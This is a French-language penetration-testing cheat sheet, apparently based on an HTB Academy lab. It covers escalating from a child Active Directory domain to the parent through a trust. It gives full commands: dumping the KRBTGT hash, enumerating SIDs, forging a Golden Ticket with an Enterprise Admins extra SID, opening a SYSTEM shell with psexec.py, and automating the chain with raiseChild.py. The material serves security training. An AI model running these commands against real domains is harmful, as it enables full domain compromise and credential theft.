# Attaque des Domain Trusts – De l’Enfant vers le Parent (Linux)

***

## <mark style="color:red;">**1. Prérequis / Données nécessaires**</mark>

Pour lancer l’attaque, vous devez recueillir les éléments suivants :

* **Hash KRBTGT du domaine enfant**\
  (extrait via DCSync)
* **SID du domaine enfant**\
  (à récupérer par brute force avec lookupsid.py)
* **Nom d’un utilisateur cible** dans le domaine enfant (ex : _hacker_ — il peut ne pas exister)
* **FQDN du domaine enfant**\
  (exemple : `LOGISTICS.INLANEFREIGHT.LOCAL`)
* **SID du groupe Enterprise Admins du domaine parent**\
  (construit à partir du Domain SID parent + RID bien connu, ex : RID 519)

***

## <mark style="color:red;">**2. Récupération des informations sur le domaine enfant**</mark>

<mark style="color:green;">**a) Extraction du hash KRBTGT avec secretsdump.py**</mark>

{% code overflow="wrap" fullWidth="true" %}
```bash
secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt
```
{% endcode %}

* **But :** Utiliser la méthode DRSUAPI pour obtenir les secrets de la base NTDS.DIT et extraire le hash NTLM (ainsi que les clés Kerberos) du compte KRBTGT.

<mark style="color:green;">**b) Obtention du SID du domaine enfant avec lookupsid.py**</mark>

{% code fullWidth="true" %}
```bash
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240
```
{% endcode %}

* **But :** Brute-forcer les SID et afficher la liste des comptes.
* **Astuce :** Filtrer la sortie (avec `grep "Domain SID"`) pour isoler le SID du domaine enfant, par exemple :\
  `S-1-5-21-2806153819-209893948-922872689`.

***

## <mark style="color:red;">**3. Récupération des informations sur le domaine parent**</mark>

<mark style="color:green;">**a) Récupérer le Domain SID du parent**</mark>

Exécutez lookupsid.py contre le DC du domaine parent :

{% code overflow="wrap" fullWidth="true" %}
```bash
lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"
```
{% endcode %}

* **But :** Identifier le Domain SID du domaine parent, par exemple :\
  `S-1-5-21-3842939050-3880317879-2865463114`.
* **Remarque :** Pour obtenir le SID complet du groupe Enterprise Admins, vous devez y ajouter le RID (généralement **519**).

***

## <mark style="color:red;">**4. Création d’un Golden Ticket avec ticketer.py**</mark>

Utilisez **ticketer.py** en fournissant les éléments suivants :

* **-nthash** : le hash KRBTGT du domaine enfant
* **-domain** : le FQDN du domaine enfant
* **-domain-sid** : le SID du domaine enfant
* **-extra-sid** : le SID du groupe Enterprise Admins du domaine parent (ex. `S-1-5-21-3842939050-3880317879-2865463114-519`)
* **Nom de l’utilisateur cible** (ex : _hacker_)

```bash
ticketer.py -nthash 9d765b482771505cbe97411065964d5f \
  -domain LOGISTICS.INLANEFREIGHT.LOCAL \
  -domain-sid S-1-5-21-2806153819-209893948-922872689 \
  -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
```

* **But :** Générer un Golden Ticket qui sera valide pour les ressources du domaine enfant ET du domaine parent.
* **Résultat :** Le ticket est sauvegardé dans un fichier (ex : `hacker.ccache`).

***

## <mark style="color:red;">**5. Utilisation du Golden Ticket**</mark>

<mark style="color:green;">**a) Définir la variable d’environnement KRB5CCNAME**</mark>

```bash
export KRB5CCNAME=hacker.ccache
```

* **But :** Indiquer au système d’utiliser ce fichier ccache pour l’authentification Kerberos.

<mark style="color:green;">**b) Accès au DC du domaine parent via psexec.py**</mark>

{% code overflow="wrap" fullWidth="true" %}
```bash
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
```
{% endcode %}

* **But :** Utiliser le Golden Ticket pour se connecter au DC et obtenir un shell SYSTEM.

***

## <mark style="color:green;">**6. Automatisation avec raiseChild.py**</mark>

**raiseChild.py** simplifie l’ensemble du processus :

{% code fullWidth="true" %}
```bash
raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
```
{% endcode %}

Le script effectue les actions suivantes :

1. **Découverte du DC** du domaine enfant et détection du FQDN du domaine parent.
2. **Récupération du SID d’Enterprise Admins** du domaine parent.
3. **Extraction des credentials KRBTGT** pour les domaines enfant et parent.
4. **Création d’un Golden Ticket** intégrant le SID supplémentaire (extra-sid).
5. **Authentification et récupération des credentials** (par défaut de l’administrateur du domaine parent).
6. **Lancement d’une session PSEXEC** sur le DC cible pour obtenir un shell SYSTEM.

***
